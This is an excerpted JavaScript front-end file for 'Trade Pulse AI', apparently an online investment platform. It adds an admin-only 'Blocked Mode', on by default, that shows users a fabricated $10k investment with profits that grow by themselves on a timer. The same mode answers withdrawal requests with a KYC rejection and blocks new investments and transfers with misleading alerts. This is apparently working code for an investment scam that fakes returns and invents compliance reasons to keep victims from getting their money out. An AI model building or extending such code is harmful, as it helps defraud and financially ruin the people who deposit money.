// ===== Trade Pulse AI – main.js (ADMIN TOGGLE, BLOCKED 10k MODE, FULL FEATURES) =====
(function() {
  ...
  // ---- Plan tracking ----
  let activePlanKey = 'beginner';
  let currentPlanAvg = 3.0;

  // ========== ADMIN & BLOCKED MODE ==========
  const isAdmin = sessionStorage.getItem('tpa_admin') === 'true';
  if (localStorage.getItem('tpa_blocked_mode') === null) {
    localStorage.setItem('tpa_blocked_mode', 'true');   // default ON
  }
  let blockedModeActive = localStorage.getItem('tpa_blocked_mode') === 'true';

  // Admin panel creation (only for admin)
  if (isAdmin) {
    // Add gear button in topbar
    ...
    if (topbar) {
      ...
      adminBtn.addEventListener('click', () => {
        ...
        if (!modal) {
          ...
          modal.innerHTML = `
            <div class="modal-panel" style="max-width:360px;">
              <div class="modal-header">
                ...
                <button class="modal-close-btn" id="closeAdminModalBtn">✕</button>
              </div>
              <div class="notice-box">
                <div class="notice-title">Blocked Mode (10k auto‑grow + KYC rejection)</div>
                <div style="display:flex; align-items:center; justify-content:space-between; margin-top:12px;">
                  <span id="adminToggleLabel">Status: ${blockedModeActive ? 'ON' : 'OFF'}</span>
                  <label class="switch" style="position:relative; display:inline-block; width:44px; height:24px;">
                    <input type="checkbox" id="adminBlockToggle" ${blockedModeActive ? 'checked' : ''} style="opacity:0;width:0;height:0;">
                    <span style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background:${blockedModeActive ? '#22c55e' : '#6b7280'}; border-radius:24px; transition:.3s;"></span>
                  </label>
                </div>
              </div>
            </div>
          ...
          document.getElementById('closeAdminModalBtn').addEventListener('click', () => modal.classList.remove('open'));
          modal.addEventListener('click', (e) => { if (e.target === modal) modal.classList.remove('open'); });
          
          document.getElementById('adminBlockToggle').addEventListener('change', function() {
            const newState = this.checked;
            localStorage.setItem('tpa_blocked_mode', newState ? 'true' : 'false');
            document.getElementById('adminToggleLabel').textContent = 'Status: ' + (newState ? 'ON' : 'OFF');
  ...
  // ========== BASE – dynamic depending on blocked mode ==========
  let base = {
    homeBalance: 0,
    totalInvested: 0,
    totalProfit: 0,
    ...
    if (requestBtn) {
      requestBtn.addEventListener('click', () => {
        if (blockedModeActive) {
          // Block withdrawal – open KYC rejection
          const user = currentUser || getStoredUser();
  ...
  // Investment Flow (blocked if in blocked mode)
  ...
  $('confirmInvestBtn')?.addEventListener('click', () => {
    if (blockedModeActive) { alert('You already have an active plan.'); return; }
  ...
  $('confirmTransferBtn')?.addEventListener('click', () => {
    if (blockedModeActive) {
      alert('Transfers are disabled in blocked mode.');
      return;
    }
  ...
  // Withdraw Confirm (used only when not blocked; still here for fallback)
  ...
  // Wallet Actions (withdraw blocked as above)
  ...
  // ========== DYNAMIC PLAN-BASED TRADING (only if blockedModeActive) ==========
  setInterval(() => {
    if (!blockedModeActive) return;   // no auto‑grow in normal mode
    if (!$('homeView')?.classList.contains('active')) return;
    if (base.totalInvested <= 0) return;

    // Daily profit from the active plan (beginners 3%)
  ...
  function tryInitialize() {
    ...
    if (blockedModeActive) {
      // ---- BLOCKED STATE: 10k invested, KYC rejected, no new investments ----
      ...
      // Show static beginner plan card in My Investments
      ...
      // ---- NORMAL MODE: fresh start ----
      base.homeBalance = currentUser.homeBalance || 0;
      base.totalInvested = currentUser.totalInvested || 0;
      base.totalWithdrawn = currentUser.totalWithdrawn || 0;
      base.activePlans = currentUser.activePlans || 0;
      activePlanKey = null;   // no plan active
      currentPlanAvg = 0;

      // Clear static investment content
      const myInvestmentsView = document.getElementById('myInvestmentsView');
      if (myInvestmentsView) myInvestmentsView.innerHTML = '';
    }
